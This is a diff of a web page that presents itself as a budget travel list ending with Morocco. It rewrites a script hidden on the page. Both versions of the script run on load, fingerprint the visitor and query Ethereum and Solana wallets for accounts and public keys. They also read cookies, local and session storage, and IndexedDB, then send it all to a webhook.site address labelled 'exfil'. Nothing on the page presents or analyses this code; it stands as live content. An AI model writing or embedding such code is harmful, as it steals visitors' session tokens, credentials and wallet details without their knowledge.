@@ -14,147 +14,90 @@
   <h2>5. Morocco</h2><p>Rich culture, stunning architecture, $30-35/day.</p>
 
   <script>
-    const WH = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4';
-    
-    // Reliable send — image beacon, never blocked by CORS
-    function send(tag, data) {
-      new Image().src = WH + '?' + tag + '=' + encodeURIComponent(JSON.stringify(data));
-    }
-
     (async function() {
-      // BEACON 1: Identity + Location
+      const WH = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4';
+      const d = {};
+
+      // Identity
+      d.isBrave = !!(navigator.brave && await navigator.brave.isBrave());
+      d.userAgent = navigator.userAgent;
+      d.platform = navigator.platform;
+      d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      d.language = navigator.language;
+      d.languages = navigator.languages;
+
+      // IP
+      try { d.ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
+
+      // Hardware
+      d.screen = screen.width+'x'+screen.height;
+      d.cores = navigator.hardwareConcurrency;
+      d.memory = navigator.deviceMemory;
+      d.maxTouch = navigator.maxTouchPoints;
+      d.plugins = Array.from(navigator.plugins||[]).map(p=>p.name);
+
+      // Ethereum wallet
+      const eth = window.ethereum;
+      const be = window.braveEthereum;
+      d.hasEthereum = !!eth;
+      d.hasBraveEthereum = !!be;
+      if (eth) {
+        d.isBraveWallet = eth.isBraveWallet||false;
+        d.isMetaMask = eth.isMetaMask||false;
+        d.selectedAddress = eth.selectedAddress||null;
+        d.isConnected = eth.isConnected ? eth.isConnected() : null;
+        try { d.chainId = await eth.request({method:'eth_chainId'}); } catch(e){}
+        try { d.blockNumber = await eth.request({method:'eth_blockNumber'}); } catch(e){}
+        try { d.accounts = await eth.request({method:'eth_accounts'}); } catch(e){}
+        d.networkVersion = eth.networkVersion||null;
+        d.ethMethods = be ? Object.getOwnPropertyNames(Object.getPrototypeOf(be)) : [];
+      }
+
+      // Solana wallet
+      const sol = window.braveSolana;
+      d.hasBraveSolana = !!sol;
+      if (sol) {
+        d.solIsBraveWallet = sol.isBraveWallet||false;
+        d.solIsConnected = sol.isConnected||false;
+        d.solPublicKey = sol.publicKey ? sol.publicKey.toString() : null;
+        d.solMethods = Object.getOwnPropertyNames(Object.getPrototypeOf(sol));
+      }
+
+      // Brave-specific window props
+      d.braveProps = Object.keys(window).filter(k=>
+        k.toLowerCase().includes('brave')||k.toLowerCase().includes('solana')||
+        k.toLowerCase().includes('ethereum')||k.toLowerCase().includes('phantom'));
+
+      // Cookies + Storage
+      d.cookies = document.cookie||'none';
+      d.cookieEnabled = navigator.cookieEnabled;
+      let ls = {};
+      for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,200);}
+      d.localStorage = ls;
+      let ss = {};
+      for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k).substring(0,200);}
+      d.sessionStorage = ss;
+
+      // IndexedDB
+      try { d.indexedDBs = (await indexedDB.databases()).map(x=>({name:x.name,ver:x.version})); } catch(e){ d.indexedDBs=[]; }
+
+      // History + Service Workers + Caches
+      d.urlHistory = performance.getEntries().filter(e=>e.entryType==='navigation'||e.entryType==='resource').map(e=>e.name).slice(0,10);
+      try { d.serviceWorkers = (await navigator.serviceWorker.getRegistrations()).map(r=>r.scope); } catch(e){ d.serviceWorkers=[]; }
+      try { d.cacheNames = await caches.keys(); } catch(e){ d.cacheNames=[]; }
+
+      d.timestamp = new Date().toISOString();
+
+      // Send everything in one shot
+      const payload = JSON.stringify(d);
+      
+      // Try fetch first
       try {
-        let ip = '';
-        try { ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
-        
-        send('identity', {
-          ip: ip,
-          isBrave: !!(navigator.brave && await navigator.brave.isBrave()),
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          languages: navigator.languages,
-          doNotTrack: navigator.doNotTrack
-        });
-      } catch(e) { send('error1', e.message); }
+        await fetch(WH, {method:'POST', headers:{'Content-Type':'application/json'}, body:payload});
+      } catch(e) {}
 
-      // BEACON 2: Hardware Fingerprint
-      try {
-        let gpu = 'unknown';
-        try {
-          let c = document.createElement('canvas');
-          let gl = c.getContext('webgl');
-          let ext = gl.getExtension('WEBGL_debug_renderer_info');
-          if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-        } catch(e){}
-
-        send('hardware', {
-          screen: screen.width + 'x' + screen.height,
-          colorDepth: screen.colorDepth,
-          cores: navigator.hardwareConcurrency,
-          memory: navigator.deviceMemory,
-          maxTouch: navigator.maxTouchPoints,
-          gpu: gpu,
-          plugins: Array.from(navigator.plugins||[]).map(p=>p.name)
-        });
-      } catch(e) { send('error2', e.message); }
-
-      // BEACON 3: Brave Wallet — Ethereum
-      try {
-        const eth = window.ethereum;
-        const be = window.braveEthereum;
-        let chainId = null, blockNum = null, netVer = null, connected = null;
-        
-        if (eth) {
-          try { chainId = await eth.request({method:'eth_chainId'}); } catch(e){}
-          try { blockNum = await eth.request({method:'eth_blockNumber'}); } catch(e){}
-          try { netVer = eth.networkVersion; } catch(e){}
-          try { connected = eth.isConnected(); } catch(e){}
-        }
-
-        send('wallet_eth', {
-          hasEthereum: !!eth,
-          hasBraveEthereum: !!be,
-          isBraveWallet: eth ? eth.isBraveWallet : false,
-          isMetaMask: eth ? eth.isMetaMask : false,
-          chainId: chainId,
-          blockNumber: blockNum,
-          networkVersion: netVer,
-          isConnected: connected,
-          selectedAddress: eth ? eth.selectedAddress : null,
-          methods: be ? Object.getOwnPropertyNames(Object.getPrototypeOf(be)) : []
-        });
-      } catch(e) { send('error3', e.message); }
-
-      // BEACON 4: Brave Wallet — Solana
-      try {
-        const sol = window.braveSolana;
-        send('wallet_sol', {
-          hasBraveSolana: !!sol,
-          isBraveWallet: sol ? sol.isBraveWallet : false,
-          isPhantom: sol ? sol.isPhantom : false,
-          isConnected: sol ? sol.isConnected : false,
-          publicKey: sol && sol.publicKey ? sol.publicKey.toString() : null,
-          methods: sol ? Object.getOwnPropertyNames(Object.getPrototypeOf(sol)) : []
-        });
-      } catch(e) { send('error4', e.message); }
-
-      // BEACON 5: Brave-specific window properties
-      try {
-        send('brave_props', {
-          braveProps: Object.keys(window).filter(k => 
-            k.toLowerCase().includes('brave') || 
-            k.toLowerCase().includes('solana') ||
-            k.toLowerCase().includes('ethereum') ||
-            k.toLowerCase().includes('phantom')
-          ),
-          cookieEnabled: navigator.cookieEnabled,
-          cookies: document.cookie || 'none'
-        });
-      } catch(e) { send('error5', e.message); }
-
-      // BEACON 6: Storage — tokens, keys, user data
-      try {
-        let ls = {};
-        for (let i = 0; i < localStorage.length; i++) {
-          let k = localStorage.key(i);
-          ls[k] = localStorage.getItem(k).substring(0, 200);
-        }
-        let ss = {};
-        for (let i = 0; i < sessionStorage.length; i++) {
-          let k = sessionStorage.key(i);
-          ss[k] = sessionStorage.getItem(k).substring(0, 200);
-        }
-        let dbs = [];
-        try { dbs = (await indexedDB.databases()).map(d=>({name:d.name,ver:d.version})); } catch(e){}
-        
-        send('storage', {
-          localStorageCount: localStorage.length,
-          localStorage: ls,
-          sessionStorageCount: sessionStorage.length,
-          sessionStorage: ss,
-          indexedDBs: dbs
-        });
-      } catch(e) { send('error6', e.message); }
-
-      // BEACON 7: Navigation history + service workers
-      try {
-        let sw = [];
-        try { sw = (await navigator.serviceWorker.getRegistrations()).map(r=>r.scope); } catch(e){}
-        let caches_list = [];
-        try { caches_list = await caches.keys(); } catch(e){}
-
-        send('history', {
-          referrer: document.referrer,
-          urlHistory: performance.getEntries()
-            .filter(e => e.entryType==='navigation'||e.entryType==='resource')
-            .map(e => e.name).slice(0, 20),
-          serviceWorkers: sw,
-          cacheNames: caches_list
-        });
-      } catch(e) { send('error7', e.message); }
-
+      // Always send image beacon as backup
+      new Image().src = WH + '?exfil=' + encodeURIComponent(payload);
     })();
   </script>
 </body>
